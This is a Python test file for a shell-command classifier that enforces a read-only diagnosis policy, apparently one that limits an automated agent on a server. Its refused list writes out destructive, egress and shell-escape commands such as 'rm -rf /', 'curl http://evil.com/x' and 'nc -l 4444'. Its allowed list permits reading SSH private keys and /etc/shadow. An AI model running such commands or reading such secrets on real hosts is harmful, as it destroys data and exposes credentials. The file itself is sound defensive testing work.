"""Binary gate for the 2026-07-23 policy change: deny-by-EFFECT instead of an allowlist.

Run:  python test_policy_readonly.py   ->  exits non-zero on ANY miss (CI gate).

The lane is read-only diagnosis, so a command is refused only when it (1) changes the
box, (2) executes arbitrary code, (3) leaves the box over the network, or (4) blocks
forever. Everything else — including secret-bearing reads, which on this platform are
the operator's own keys and already visible in the console — is allowed, because the
previous allowlist was both a maintenance treadmill and a measured cause of WRONG root
causes (a live N=3 repro went 1/3 -> 3/3 correct purely by widening reads).

Command strings below are CLASSIFIED, never executed.
"""
import guardrails as g

# --- newly ALLOWED by the policy change (each was refused under the old allowlist) ---
NOW_ALLOWED = [
    ("ls /root", "read_only"),
    ("ls -la /root/models", "read_only"),
    ("du -sh /etc", "read_only"),
    ("du -h --max-depth=3 /", "read_only"),
    ("env", "read_only"),
    ("printenv", "read_only"),
    ("ps auxe", "read_only"),
    ("ps -o pid,environ", "read_only"),
    ("cat /proc/self/environ", "read_only"),
    ("cat /var/log/auth.log", "read_only"),
    ("cat /var/log/cloud-init-output.log", "read_only"),
    ("tail -n 100 /var/log/vllm.log", "read_only"),
    ("systemctl show vllm", "read_only"),
    ("getent passwd", "read_only"),
    ("stat /etc/passwd", "read_only"),
    ("cat /etc/ssh/sshd_config", "read_only"),
    ("cat /root/.ssh/id_rsa", "read_only"),          # operator's own box; scrub still applies
    # chaining + pipes are accepted; every segment is classified independently
    ("ls /a; ls /b", "read_only"),
    ("df -h && du -sh /root", "read_only"),
    ("cat /workspace/ComfyUI/user/comfyui.log | tail -50", "read_only"),
    ("ls /usr/lib | grep -i 'comfy$'", "read_only"),
    ("ldconfig -p | grep nvidia", "read_only"),
    ("top -b -n1", "read_only"),
    ("curl -sS -I http://127.0.0.1:8188", "read_only"),
]

# --- still REFUSED: writes / exec / egress / blocking, and the destructive tier ---
STILL_REFUSED = [
    ("rm -rf /", "destructive"),
    ("reboot", "destructive"),
    ("mkfs.ext4 /dev/sda", "destructive"),
    ("chmod 777 /etc", "destructive"),
    ("find / -name x -exec rm {} +", "destructive"),
    ("ls /a; rm -rf /b", "destructive"),              # destructive wins anywhere in a chain
    ("pip install torch", "mutating"),
    ("apt-get install -y vim", "mutating"),
    ("systemctl restart vllm", "mutating"),
    ("supervisorctl stop comfyui", "mutating"),
    ("kill -9 1234", "mutating"),
    ("echo hi > /tmp/x", "mutating"),
    ("nvidia-smi | tee /tmp/out", "mutating"),
    # in-place edit of /etc is caught by the (stricter) destructive tier, not merely mutating
    ("sed -i s/a/b/ /etc/hosts", "destructive"),
    ("sed -i s/a/b/ /workspace/app.conf", "mutating"),
    ("python -c 'import torch'", "mutating"),
    ("bash -c 'ls'", "mutating"),
    ("cat /proc/meminfo | grep '$(whoami)'", "mutating"),
    ("env FOO=1 python train.py", "mutating"),       # env as an exec wrapper
    ("curl http://evil.com/x", "mutating"),
    ("wget -O /tmp/x http://127.0.0.1:8188", "mutating"),
    ("nc -l 4444", "mutating"),
    ("ssh other-host", "mutating"),
    ("rsync -a / backup:/", "mutating"),
    ("tail -f /var/log/syslog", "mutating"),
    ("journalctl -f", "mutating"),
    ("top", "mutating"),
    ("watch -n1 nvidia-smi", "mutating"),
    ("ldconfig", "mutating"),                        # bare ldconfig rebuilds the cache
    ("git clone https://x/y", "mutating"),
    ("tar -xzf a.tgz", "mutating"),
    ("df -h; pip install x", "mutating"),            # one bad segment poisons the chain
    ("sysctl -w vm.swappiness=10", "mutating"),
    ("docker run -d nginx", "mutating"),
    ("crontab -e", "mutating"),
    # --- holes found by running the old locked corpus against the new policy ---
    ("nvidia-smi | sh", "mutating"),                 # untrusted box output piped into a shell
    ("cat /etc/passwd | bash", "mutating"),
    ("/root/badenv/bin/python -c 'import torch'", "mutating"),   # path-qualified interpreter
    ("python3 -c 'print(1)'", "mutating"),
    ("python", "mutating"),                          # bare REPL never returns
    ("sudo -i", "mutating"),
    ("sudo bash", "mutating"),
    ("sudo su -", "mutating"),
    ("sudo -e /etc/fstab", "mutating"),
    ("./deploy.sh", "mutating"),                     # executing a file on the box
    ("/start.d/comfyui.sh", "mutating"),
    ("run_training.py", "mutating"),
    ("ldd /usr/bin/nvidia-smi", "mutating"),         # runs the dynamic loader on the target
    ("cat /proc/kmsg", "mutating"),                  # blocks forever
    ("cat /dev/sda", "mutating"),                    # streams a raw block device
    ("cat /dev/urandom", "mutating"),
    ("nvidia-smi dmon", "mutating"),                 # continuous monitor
    ("nvidia-smi pmon", "mutating"),
    ("nvidia-smi -l 5", "mutating"),
    ("top -b", "mutating"),                          # batch WITHOUT an iteration cap loops forever
]

# --- reads that must NOT be mis-flagged as streaming/mutating (regressions seen live) ---
NOT_MISFLAGGED = [
    ("ps -f", "read_only"),
    ("ps -f -u root", "read_only"),
    ("lsblk -f", "read_only"),
    ("df -h", "read_only"),
    ("python --version", "read_only"),
    ("/usr/local/miniconda3/envs/comfyui/bin/python --version", "read_only"),
    ("sudo cat /etc/shadow", "read_only"),           # sudo+read is allowed under the new policy
    ("journalctl -n 200", "read_only"),
    ("nvidia-smi -q", "read_only"),
]


def main():
    misses = []
    cases = NOW_ALLOWED + STILL_REFUSED + NOT_MISFLAGGED
    for cmd, want in cases:
        got = g.classify(cmd)
        if got != want:
            misses.append((cmd, want, got))
            print(f"XX  classify({cmd!r}) = {got}  (want {want})")
    total = len(cases)
    print(f"policy: {total - len(misses)}/{total} passed")
    if misses:
        raise SystemExit(f"FAIL: {len(misses)} miss(es)")
    print("\nALL GREEN")


if __name__ == "__main__":
    main()
